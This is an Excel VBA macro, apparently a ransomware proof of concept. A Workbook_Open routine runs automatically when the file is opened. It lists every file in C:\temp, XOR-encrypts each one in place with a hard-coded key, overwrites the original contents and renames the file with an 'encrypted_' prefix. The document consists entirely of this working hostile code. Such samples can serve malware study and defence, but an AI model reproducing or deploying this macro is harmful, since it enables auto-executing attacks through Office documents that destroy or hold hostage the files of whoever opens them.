Private Sub Workbook_Open()
    Dim secret As String
    ' The secret that gets used for the XOR encryption
    ' In theory, a secret with enough entropy and a length that is equal to or more than the content that is to be encrypted,
    ' makes for perfect encryption
    ' It is however not practical, but as this is a PoC, it will suffice.
    secret = "mysecret123!"
    
    Set files = getFiles("C:\temp")
    For Each f In files
        Call EncryptFile(f, secret)
    Next
End Sub


Function getFiles(ByVal sPath As String) As Object
    
        Dim vaArray     As Variant
        Dim i           As Integer
        Dim oFile       As Object
        Dim oFSO        As Object
        Dim oFolder     As Object
        Dim oFiles      As Object
    
        Set oFSO = CreateObject("Scripting.FileSystemObject")
        Set oFolder = oFSO.GetFolder(sPath)
        Set getFiles = oFolder.files
End Function

Sub EncryptFile(ByVal f As String, ByVal secret As String)
    Dim content As String
    Dim b() As Byte
    Dim bSecret() As Byte
    
    Dim bResult() As Byte
    bResult = "encrypted"
    Set FSO = CreateObject("Scripting.FileSystemObject")
    Set file = FSO.GetFile(f)
    Set ts = file.OpenAsTextStream(1, -2)
    content = ts.ReadAll()
    ts.Close
    b = content
    bSecret = secret
    Dim bLength As Integer
    bLength = UBound(b) - LBound(b) + 1
    Dim bSecretLength As Integer
    bSecretLength = UBound(bSecret) - LBound(bSecret) + 1
    Dim i As Integer
    For i = 0 To bLength - 1
        Dim current As Byte
        current = b(i) Xor bSecret(i Mod bSecretLength)
        Dim newLen As Integer
        newLen = UBound(bResult) + 1
        ReDim Preserve bResult(newLen)
        bResult(UBound(bResult)) = current
    Next
    Dim resultStr As String
    resultStr = bResult
    Set file = FSO.GetFile(f)
    Set ts2 = file.OpenAsTextStream(2, -2)
    ts2.Write resultStr
    ts2.Close
    file.Move ("C:\temp\encrypted_" + file.Name)
    Set ts1 = Nothing
    Set ts2 = Nothing
    Set file = Nothing
End Sub




